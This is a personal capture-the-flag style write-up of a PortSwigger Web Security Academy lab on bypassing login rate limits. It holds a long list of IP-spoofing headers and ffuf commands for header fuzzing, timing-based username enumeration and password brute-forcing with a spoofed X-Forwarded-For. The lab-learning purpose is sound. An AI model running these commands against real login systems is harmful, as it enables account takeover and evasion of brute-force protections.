https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-broken-logic

In this lab our IP is beeing blocked
![[Pasted image 20241105104052.png]]
Normally you are banned by an IP and the lab description confirms that. Let's send fuzz with the most commom [[IP_Spoofing_Headers]] headers
```sh
echo "CACHE_INFO: 127.0.0.1
CF_CONNECTING_IP: 127.0.0.1
CF-Connecting-IP: 127.0.0.1
CLIENT_IP: 127.0.0.1
Client-IP: 127.0.0.1
COMING_FROM: 127.0.0.1
CONNECT_VIA_IP: 127.0.0.1
FORWARD_FOR: 127.0.0.1
FORWARD-FOR: 127.0.0.1
FORWARDED_FOR_IP: 127.0.0.1
FORWARDED_FOR: 127.0.0.1
FORWARDED-FOR-IP: 127.0.0.1
FORWARDED-FOR: 127.0.0.1
FORWARDED: 127.0.0.1
HTTP-CLIENT-IP: 127.0.0.1
HTTP-FORWARDED-FOR-IP: 127.0.0.1
HTTP-PC-REMOTE-ADDR: 127.0.0.1
HTTP-PROXY-CONNECTION: 127.0.0.1
HTTP-VIA: 127.0.0.1
HTTP-X-FORWARDED-FOR-IP: 127.0.0.1
HTTP-X-IMFORWARDS: 127.0.0.1
HTTP-XROXY-CONNECTION: 127.0.0.1
PC_REMOTE_ADDR: 127.0.0.1
PRAGMA: 127.0.0.1
PROXY_AUTHORIZATION: 127.0.0.1
PROXY_CONNECTION: 127.0.0.1
Proxy-Client-IP: 127.0.0.1
PROXY: 127.0.0.1
REMOTE_ADDR: 127.0.0.1
Source-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
Via: 127.0.0.1
WL-Proxy-Client-IP: 127.0.0.1
X_CLUSTER_CLIENT_IP: 127.0.0.1
X_COMING_FROM: 127.0.0.1
X_DELEGATE_REMOTE_HOST: 127.0.0.1
X_FORWARDED_FOR_IP: 127.0.0.1
X_FORWARDED: 127.0.0.1
X_IMFORWARDS: 127.0.0.1
X_LOCKING: 127.0.0.1
X_LOOKING: 127.0.0.1
X_REAL_IP: 127.0.0.1
X-Backend-Host: 127.0.0.1
X-BlueCoat-Via: 127.0.0.1
X-Cache-Info: 127.0.0.1
X-Forward-For: 127.0.0.1
X-Forwarded-By: 127.0.0.1
X-Forwarded-For-Original: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Forwarded-For: 127.0.0.1, 127.0.0.1, 127.0.0.1
X-Forwarded-Server: 127.0.0.1
X-Forwarded-Host: 127.0.0.1
X-From-IP: 127.0.0.1
X-From: 127.0.0.1
X-Gateway-Host: 127.0.0.1
X-Host: 127.0.0.1
X-Ip: 127.0.0.1
X-Original-Host: 127.0.0.1
X-Original-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Original-Remote-Addr: 127.0.0.1
X-Original-Url: 127.0.0.1
X-Originally-Forwarded-For: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-ProxyMesh-IP: 127.0.0.1
X-ProxyUser-IP: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Host: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-True-Client-IP: 127.0.0.1
XONNECTION: 127.0.0.1
XPROXY: 127.0.0.1
XROXY_CONNECTION: 127.0.0.1
Z-Forwarded-For: 127.0.0.1
ZCACHE_CONTROL: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1" | awk '{print $1}' | tr -d ':' >./IP-spoof.txt
```
Then fuzz it using pitch for
```sh
ffuf -u https://0a91005e044fd2db807d6c85009c004b.web-security-academy.net/login -d "username=1234&password=asd" -H "W1:W2" -X POST -w IP-spoof.txt:W1 -w /usr/share/seclists/Fuzzing/3-digits-000-999.txt:W2 -v -replay-proxy http://127.0.0.1:8080
```
And do a negative filtering from the request which not contain "`You have made too many incorrect login attempts. Please try again in 30 minute(s).`"
![[Pasted image 20241105134434.png]]
And the only header that appear is `X-Forwarded-For` so now we know which what header spoof our IP. We couldn't fuzz thre payloads, but if we submit the right username with a very long password it will cause a time out, so only test for username and a range of numbers
```sh
ffuf -u https://0a91005e044fd2db807d6c85009c004b.web-security-academy.net/login -d "username=W1&password=Youhavemadetoomanyincorrectloginattempts.Pleasetryagainin30minute(s).Youhavemadetoomanyincorrectloginattempts.Pleasetryagainin30minute(s).Youhavemadetoomanyincorrectloginattempts.Pleasetryagainin30minute(s).Youhavemadetoomanyincorrectloginattempts.Pleasetryagainin30minute(s).Youhavemadetoomanyincorrectloginattempts.Pleasetryagainin30minute(s).Youhavemadetoomanyincorrectloginattempts.Pleasetryagainin30minute(s)." -H "X-Forwarded-For: W2" -X POST -w /usr/share/seclists/Fuzzing/3-digits-000-999.txt:W2 -mode pitchfork -w username-list.txt:W1 >./ffuf_name.txt
```
Now we will look for the longest duaration 

```sh
awk -F 'Duration: ' '{print $2 " " $0}' ffuf_name.txt | sort -nr | head -n 1     
```
![[Pasted image 20241105141434.png]]
As this file will have annoying line escapes, the best way to find it is by doing `nano ffuf_name.txt` and look for that matches
![[Pasted image 20241105141508.png]]
Let's set that username and bruteforce the passwords
```sh
ffuf -u https://0a91005e044fd2db807d6c85009c004b.web-security-academy.net/login -d "username=ajax&password=W1" -H "X-Forwarded-For: W2" -X POST -w /usr/share/seclists/Fuzzing/3-digits-000-999.txt:W2 -mode pitchfork -w password-list.txt:W1 -replay-proxy http://127.0.0.1:8081 
```
Now go to the proxy and look for the 302 redirect
![[Pasted image 20241105143254.png]]